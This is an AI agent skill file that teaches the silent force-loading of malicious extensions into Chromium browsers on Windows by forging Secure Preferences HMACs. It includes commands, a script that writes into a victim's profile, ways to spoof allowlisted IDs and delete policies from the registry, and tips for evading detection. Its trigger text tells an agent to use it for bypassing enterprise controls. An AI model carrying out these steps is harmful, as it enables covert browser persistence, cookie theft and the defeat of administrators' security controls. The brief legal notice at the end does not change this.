---
name: forced-extension-load-mac-forgery
description: Force-load arbitrary browser extensions in Chromium-based browsers (Chrome, Edge, Brave) on Windows by forging valid HMACs in Preferences/Secure Preferences files. Use this skill whenever you need to persist a browser extension silently, bypass extension allowlists, or achieve in-browser code execution during post-exploitation. Trigger for any task involving browser extension persistence, Chromium preference manipulation, or bypassing enterprise extension controls.
---

# Forced Extension Load & Preferences MAC Forgery (Windows)

A stealthy post-exploitation technique to force-load arbitrary extensions in Chromium-based browsers on Windows by editing user preferences and forging valid HMACs for the modified nodes.

## What This Skill Does

- Generate deterministic extension IDs with embedded public keys
- Compute valid HMAC-SHA256 MACs for Chromium preferences nodes
- Craft preferences entries to silently activate extensions
- Bypass enterprise extension allowlists via ID spoofing
- Provide operational guidance for detection avoidance

## When to Use This Skill

Use this skill when:
- You need to persist a browser extension without user interaction
- You want to bypass extension install allowlists/blocklists
- You're performing post-exploitation and need in-browser code execution
- You need to modify Chromium/Edge/Brave preferences with valid MACs
- You're testing browser extension security controls

## Prerequisites

- Windows target with Chromium-based browser (Chrome, Edge, Brave)
- Write access to victim's browser profile directory
- Python 3 with `cryptography` library installed
- Target browser version: Chromium 130-139 (verified)

## Quick Start

```bash
# Generate extension ID and key pair
python scripts/generate_extension_keys.py

# Extract HMAC seed from browser's resources.pak
python scripts/extract_hmac_seed.py --browser chrome --version 139

# Forge preferences entry with valid MACs
python scripts/forge_preferences_mac.py --extension-id <id> --seed <hex> --path <extension-path>
```

## Core Concepts

### How It Works

Chromium stores per-user extension state in JSON preferences files and protects them with HMAC-SHA256. The HMAC seed is embedded in the browser's `resources.pak` file. By computing valid MACs with the browser's embedded seed and writing them next to injected nodes, the browser accepts and activates your extension entry.

### Where Extension State Lives (Windows)

| Browser Type | Profile Path | Preferences File |
|--------------|--------------|------------------|
| Non-domain-joined Chrome | `%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\` | `Secure Preferences` |
| Domain-joined Chrome | `%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\` | `Preferences` |
| Edge | `%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\` | `Secure Preferences` |
| Brave | `%USERPROFILE%\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\` | `Secure Preferences` |

### Key Preference Nodes

```
extensions.settings.<extension_id> → Extension metadata
extensions.ui.developer_mode → Boolean (required for unpacked extensions, Chromium ≥134)
protection.macs.extensions.settings.<extension_id> → HMAC for settings node
protection.macs.extensions.ui.developer_mode → HMAC for developer_mode (Chromium ≥134)
```

## Step-by-Step Methodology

### Step 1: Prepare Your Extension

Create an unpacked MV3 extension with a deterministic ID:

```json
// manifest.json
{
  "manifest_version": 3,
  "name": "Your Extension",
  "version": "1.0",
  "key": "<BASE64_DER_SPKI>",
  "permissions": ["tabs", "storage", "cookies"],
  "background": {
    "service_worker": "background.js"
  }
}
```

**Important**: Embedding a fixed `key` in manifest.json locks the extension ID to that key instead of the installation path, making it stable across hosts.

### Step 2: Generate Extension Keys

Run the key generation script:

```bash
python scripts/generate_extension_keys.py
```

Output:
```
Extension ID: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
Public Key (base64): MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...
Private Key (base64): MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSk...
```

Add the public key to your `manifest.json` under the `key` field.

### Step 3: Extract HMAC Seed

Extract the HMAC seed from the browser's `resources.pak`:

```bash
# For Chrome
python scripts/extract_hmac_seed.py --browser chrome --version 139

# For Edge (may use different seed)
python scripts/extract_hmac_seed.py --browser edge --version 139
```

The seed is typically in file ID 146 of `resources.pak`. The script outputs the hex-encoded seed.

### Step 4: Forge Preferences Entry

Craft the preferences entry with valid MACs:

```bash
python scripts/forge_preferences_mac.py \
  --extension-id a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 \
  --seed <extracted_seed_hex> \
  --path C:\\Users\\victim\\AppData\\Local\\Temp\\evil-extension \
  --output preferences_patch.json
```

This generates a JSON patch with:
- `extensions.settings.<id>` - Extension metadata
- `extensions.ui.developer_mode` - Set to `true`
- `protection.macs.*` - Valid HMACs for both nodes

### Step 5: Apply to Target Profile

Merge the patch into the target's preferences file:

```python
import json

# Load existing preferences
with open('C:\\Users\\victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Secure Preferences', 'r') as f:
    prefs = json.load(f)

# Load patch
with open('preferences_patch.json', 'r') as f:
    patch = json.load(f)

# Merge (simplified - use deep merge in production)
for key, value in patch.items():
    prefs[key] = value

# Write back
with open('C:\\Users\\victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Secure Preferences', 'w') as f:
    json.dump(prefs, f, separators=(',', ':'))
```

**Next browser launch will auto-activate your extension.**

## Bypassing Enterprise Controls

### Extension ID Spoofing

Bypass `ExtensionInstallAllowlist` by spoofing a whitelisted extension's ID:

1. Install an allowed Web Store extension
2. Extract its public key via `chrome.runtime.getManifest().key`
3. Use that key in your malicious extension's manifest
4. Forge preferences with the spoofed ID

The allowlist check matches on ID only, not hash.

### Extension Stomping

If a local unpacked extension shares an ID with an installed Web Store extension, Chromium prefers the unpacked one. This replaces the legitimate extension while preserving the trusted ID.

### Neutralizing GPO (Admin Required)

```powershell
# Remove extension policies
reg delete "HKCU\Software\Policies\Google\Chrome\ExtensionInstallAllowlist" /f
reg delete "HKCU\Software\Policies\Google\Chrome\ExtensionInstallBlocklist" /f
```

## Detection and Evasion

### What Gets Logged

- File writes to `Preferences`/`Secure Preferences`
- New nodes under `extensions.settings`
- Changes to `extensions.ui.developer_mode`
- Registry modifications to `HKCU\Software\Policies\*`

### Evasion Tips

1. **Time-based**: Write preferences when browser is closed
2. **Process-based**: Use a legitimate process (e.g., `chrome.exe` via injection) to write files
3. **MAC validation**: Always compute valid MACs - invalid MACs trigger warnings
4. **Minimal changes**: Only modify necessary nodes, preserve existing structure

### What NOT to Do

- ❌ Use `--load-extension` command-line flag (noisy, widely monitored)
- ❌ Write invalid MACs (browser will reject and may log)
- ❌ Modify preferences while browser is running (changes may be reverted)

## Extension Capabilities

Once activated, your extension runs with declared permissions:

| Permission | Capability |
|------------|------------|
| `tabs` | Access tab content, URLs, navigation |
| `cookies` | Read/modify all cookies |
| `storage` | Persistent local storage |
| `webRequest` | Intercept/modify HTTP requests |
| `activeTab` | Access currently active tab |
| `scripting` | Inject scripts into pages |

## Troubleshooting

### Extension Doesn't Activate

1. Verify `extensions.ui.developer_mode` is `true` and has valid MAC (Chromium ≥134)
2. Check extension path is absolute and accessible
3. Ensure manifest.json is valid and includes the `key` field
4. Verify MACs are uppercase hex

### Browser Rejects Preferences

1. Check JSON serialization matches Chromium's format (compact, no whitespace)
2. Verify HMAC seed is correct for the browser version
3. Ensure you're writing to the correct profile (Default vs Profile 1, etc.)

### Edge/Brave Differences

- Edge and Brave may use different HMAC seeds (sometimes null)
- Test on target browser version before deployment
- Some builds may have additional protections

## Scripts Reference

### `scripts/generate_extension_keys.py`

Generates RSA key pair and deterministic extension ID.

```bash
python scripts/generate_extension_keys.py
# Output: (extension_id, public_key_b64, private_key_b64)
```

### `scripts/extract_hmac_seed.py`

Extracts HMAC seed from browser's `resources.pak`.

```bash
python scripts/extract_hmac_seed.py --browser chrome --version 139
# Output: hex-encoded seed
```

### `scripts/forge_preferences_mac.py`

Creates preferences patch with valid MACs.

```bash
python scripts/forge_preferences_mac.py \
  --extension-id <id> \
  --seed <hex> \
  --path <extension-path> \
  --output patch.json
```

## References

- [The Phantom Extension: Backdooring Chrome](https://www.synacktiv.com/en/publications/the-phantom-extension-backdooring-chrome-through-uncharted-pathways.html)
- [SecurePreferencesFile Research](https://github.com/Pica4x6/SecurePreferencesFile)
- [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome)
- [Chromium GRIT pak_util](https://chromium.googlesource.com/chromium/src/+/master/tools/grit/pak_util.py)

## Legal Notice

This skill is for authorized security testing and research only. Ensure you have explicit permission before testing on any system. Unauthorized modification of browser preferences may violate terms of service and applicable laws.
